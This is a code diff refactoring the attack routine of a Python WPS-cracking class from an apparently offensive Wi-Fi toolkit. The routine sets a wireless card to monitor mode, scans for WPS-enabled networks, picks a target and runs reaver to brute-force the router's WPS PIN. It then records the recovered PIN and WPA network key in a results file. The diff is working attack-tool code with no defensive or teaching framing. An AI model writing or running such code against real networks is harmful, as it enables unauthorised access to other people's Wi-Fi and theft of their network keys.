@@ -8,15 +8,13 @@ import threading
 import time
 import os
 from datetime import datetime
-from modules.utils import (
-    check_wireless_tools,
-    get_interface,
-    setup_monitor_mode,
+from .utils import (
     get_data_path,
     log_activity,
     get_temp_path,
     cleanup_temp_files
 )
+from .interface_manager import InterfaceManager
 
 class WPSAttacker:
     def __init__(self):
@@ -228,82 +226,64 @@ class WPSAttacker:
     def start_attack(self):
         """Start WPS attack with improved reliability"""
         try:
-            # Check requirements
-            if not check_wireless_tools():
+            # Get interface and ensure monitor mode
+            if not InterfaceManager.ensure_monitor_mode():
+                self.console.print("[red]Failed to set monitor mode. Aborting attack.[/red]")
                 return
 
-            # Get wireless interface
-            self.interface = get_interface()
+            self.interface = InterfaceManager.get_current_interface()
             if not self.interface:
+                self.console.print("[red]No wireless interface available.[/red]")
                 return
-
-            # Enable monitor mode
-            self.console.print("\n[yellow]Enabling monitor mode...[/yellow]")
-            self.interface = setup_monitor_mode(self.interface)
-            if not self.interface:
-                self.console.print("[red]Failed to enable monitor mode![/red]")
-                return
-
-            self.console.print("[green]Monitor mode enabled successfully![/green]")
-            self.console.print(f"[cyan]Using interface: {self.interface}[/cyan]")
 
             # Scan for WPS networks
-            self.console.print("\n[yellow]Scanning for WPS-enabled networks...[/yellow]")
             networks = self.scan_wps_networks()
+            if not networks:
+                return
 
             # Select target
             if not self.select_target(networks):
                 return
 
             # Start attack
-            self.console.print("\n[yellow]Starting WPS attack...[/yellow]")
-            self.console.print("[cyan]Press Ctrl+C to stop[/cyan]")
-
+            self.console.print(f"\n[cyan]Starting WPS attack on {self.target_essid}...[/cyan]")
             self.running = True
             self.start_time = time.time()
 
-            # Run reaver attack
-            success = self.run_reaver()
-
-            # Save results
-            if success:
-                self.console.print(f"\n[green]WPS PIN found: {self.current_pin}[/green]")
+            if self.run_reaver():
+                self.console.print("\n[green]WPS Attack Successful![/green]")
+                self.console.print(f"[green]PIN Found: {self.current_pin}[/green]")
                 if self.psk:
-                    self.console.print(f"[green]WPA PSK: {self.psk}[/green]")
+                    self.console.print(f"[green]Network Key: {self.psk}[/green]")
 
-                # Save to file
+                # Save results
                 timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-                save_path = get_data_path('wps', f'wps_{timestamp}.txt')
+                result_file = get_data_path('wps', f'wps_{self.target_bssid.replace(":", "")}_{timestamp}.txt')
 
-                with open(save_path, 'w') as f:
+                with open(result_file, 'w') as f:
                     f.write("WPS Attack Results\n")
-                    f.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-                    f.write(f"Target AP: {self.target_bssid}\n")
-                    f.write(f"Target ESSID: {self.target_essid}\n")
+                    f.write("=================\n\n")
+                    f.write(f"Network: {self.target_essid}\n")
+                    f.write(f"BSSID: {self.target_bssid}\n")
+                    f.write(f"Channel: {self.target_channel}\n")
                     f.write(f"WPS PIN: {self.current_pin}\n")
                     if self.psk:
-                        f.write(f"WPA PSK: {self.psk}\n")
+                        f.write(f"Network Key: {self.psk}\n")
+                    f.write(f"\nDate: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                     f.write(f"Duration: {int(time.time() - self.start_time)} seconds\n")
                     f.write(f"PINs Tested: {self.pins_tested}\n")
 
-                self.console.print(f"\n[green]Results saved to: {save_path}[/green]")
-                log_activity(f"WPS attack successful - Target: {self.target_essid}")
+                self.console.print(f"\n[green]Results saved to: {result_file}[/green]")
+                log_activity(f"WPS attack successful - Network: {self.target_essid}")
             else:
-                self.console.print("\n[yellow]Attack completed without finding PIN[/yellow]")
-                log_activity(f"WPS attack failed - Target: {self.target_essid}")
+                self.console.print("\n[red]WPS attack failed![/red]")
+                log_activity(f"WPS attack failed - Network: {self.target_essid}")
 
         except KeyboardInterrupt:
             self.console.print("\n[yellow]Attack stopped by user[/yellow]")
         except Exception as e:
-            self.console.print(f"[red]Error during attack: {str(e)}[/red]")
-
+            self.console.print(f"[red]Error during WPS attack: {str(e)}[/red]")
         finally:
-            # Cleanup
             self.running = False
-            try:
-                subprocess.run(['airmon-ng', 'stop', self.interface],
-                             stdout=subprocess.DEVNULL,
-                             stderr=subprocess.DEVNULL)
-            except:
-                pass
-            pass 
+            # Let InterfaceManager handle mode switching
+            InterfaceManager.restore_managed_mode() 
